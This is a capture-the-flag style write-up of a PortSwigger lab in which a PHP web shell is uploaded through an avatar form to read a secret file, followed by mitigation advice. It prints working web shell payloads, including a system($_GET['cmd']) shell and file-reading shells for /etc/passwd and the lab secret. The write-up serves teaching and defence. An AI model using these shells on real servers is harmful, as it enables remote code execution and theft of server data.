# Remote Code Execution via Web Shell Upload

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** that leads to **Remote Code Execution (RCE)**.

The application allowed users to upload profile avatars but failed to properly validate uploaded file types. As a result, an attacker could upload a malicious PHP file (web shell) instead of an image.

When the uploaded PHP file was later accessed through the browser, the web server executed the PHP code, allowing the attacker to read sensitive files from the server.

This lab focused on:

- File Upload Vulnerabilities
- Web Shell Uploads
- Remote Code Execution (RCE)
- Server-Side Script Execution
- Sensitive File Disclosure

---

# 🔍 What are File Upload Vulnerabilities?

A File Upload Vulnerability occurs when an application allows users to upload files without properly validating:

- file extensions
- file content
- MIME types
- execution permissions

Example:

```text
Expected Upload:
image.png
photo.jpg

Uploaded Instead:
shell.php
```

If the server stores and executes uploaded files, attackers can run arbitrary code on the server.

---

# 🔍 What is a Web Shell?

A web shell is a malicious script uploaded to a web server.

Example:

```php
<?php system($_GET['cmd']); ?>
```

or

```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

When the attacker visits the uploaded file:

```text
https://victim.com/uploads/shell.php
```

the server executes the PHP code.

This can lead to:

- Remote Code Execution
- File Disclosure
- Server Compromise
- Full Application Takeover

---

# 🎯 Objective

The goal of this lab was to:

- upload a malicious PHP file
- execute code on the server
- retrieve Carlos's secret
- submit the secret to solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(1).png?raw=true)

The application initially displayed:

- a normal webpage
- a **My Account** button

---

## Screenshot 2 — Logging In

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(2).png?raw=true)

After clicking **My Account**, I landed on the login page.

The lab provided valid credentials:

```text
Username: wiener
Password: peter
```

I entered the credentials and logged in.

---

## Screenshot 3 — Avatar Upload Functionality

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(3).png?raw=true)

After successful authentication, I was redirected to my account page.

The page contained:

- Update Email functionality
- Avatar section
- Browse button
- Upload button

The avatar upload functionality became the primary attack surface.

---

## Screenshot 4 — Uploading a Legitimate Image

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(4).png?raw=true)

To understand how uploads worked, I selected a normal image:

```text
luffy.png
```

and uploaded it.

This helped verify:

- where files were stored
- how uploaded files were displayed

---

## Screenshot 5 — Successful Image Upload

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(5).png?raw=true)

The application responded:

```text
The file avatars/luffy.png has been uploaded.
```

This confirmed that uploaded files were being stored inside:

```text
/avatars/
```

directory.

---

## Screenshot 6 — Uploading a Malicious PHP File

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(6).png?raw=true)

After confirming the upload functionality, I attempted to upload a PHP file:

```text
virus.php
```

Contents:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

### What Does This Payload Do?

```php
file_get_contents('/home/carlos/secret')
```

reads the contents of:

```text
/home/carlos/secret
```

and

```php
echo
```

prints it to the browser.

In simple terms:

```text
Read Secret File
↓
Display Secret
```

---

## Screenshot 7 — PHP File Successfully Uploaded

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(7).png?raw=true)

The application responded:

```text
The file avatars/virus.php has been uploaded.
```

This immediately indicated a serious issue.

The application should have rejected:

```text
.php
```

files entirely.

---

## Screenshot 8 — Inspecting the Upload Request

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(8).png?raw=true)

I captured the upload request:

```http
POST /my-account/avatar
```

The uploaded file appeared as:

```http
Content-Disposition: form-data; name="avatar"; filename="virus.php"

Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>
```

### Breakdown

#### Content-Disposition

```http
Content-Disposition: form-data
```

defines the uploaded file.

#### Filename

```http
filename="virus.php"
```

tells the server the uploaded file is a PHP script.

#### Content-Type

```http
Content-Type: application/x-php
```

indicates PHP content.

#### File Contents

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

contains the malicious code that will execute on the server.

---

## Screenshot 9 — Executing the Uploaded PHP File

![Screenshot 9](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(9).png?raw=true)

After returning to the account page, the avatar appeared as a broken image.

This happened because:

```text
virus.php
```

is not an image.

I right-clicked the broken image and selected:

```text
Open Image in New Tab
```

When the browser opened:

```text
avatars/virus.php
```

the web server executed the PHP code.

The response revealed Carlos's secret:

```text
SiFwQVJiN04XskEaaFPaK9CB6kZw1UYG
```

---

# 🔍 Why Did the PHP Execute?

The application:

```text
Stored Uploaded File
↓
Made File Publicly Accessible
↓
Allowed Server To Execute It
```

Instead of treating the file as data, the server treated it as executable PHP code.

This transformed a simple file upload into:

```text
Remote Code Execution
```

---

## Screenshot 10 — Solving the Lab

![Screenshot 10](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Web%20Shell%20Upload/screenshots/lab1(10).png?raw=true)

I copied the secret:

```text
SiFwQVJiN04XskEaaFPaK9CB6kZw1UYG
```

and submitted it using the lab's solution field.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- uploaded files were not properly validated
- dangerous extensions were allowed
- uploaded files were publicly accessible
- PHP execution was enabled inside the upload directory
- server-side file type checks were missing

The application trusted user-supplied files.

---

# 💥 Impact

An attacker could potentially:

- achieve Remote Code Execution
- read sensitive files
- execute system commands
- upload web shells
- gain server access
- compromise the entire application

This is often considered a **Critical Severity** vulnerability.

---

# 🛡 Mitigation

To prevent this issue:

- block executable file extensions
- validate file content server-side
- verify MIME types
- rename uploaded files
- store uploads outside the web root
- disable script execution inside upload directories
- use allowlists for permitted file types

Example:

```text
Allowed:
.jpg
.png
.gif

Blocked:
.php
.jsp
.asp
.exe
```

---

# 🧠 Skills Learned

- File Upload Testing
- Web Shell Uploads
- Remote Code Execution
- PHP File Analysis
- Sensitive File Disclosure
- Upload Functionality Assessment
- Server-Side Script Execution

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how insecure file upload functionality can lead directly to Remote Code Execution.

By identifying that the application failed to validate uploaded files, I was able to upload a malicious PHP script, execute it through the browser, and retrieve sensitive data stored on the server.

Through this lab, I learned:

- how file upload vulnerabilities occur
- how web shells work
- why executable uploads are dangerous
- how uploaded files can lead to RCE
- how sensitive files can be accessed through server-side code execution

The lab was successfully solved by uploading and executing a malicious PHP web shell that disclosed Carlos's secret.
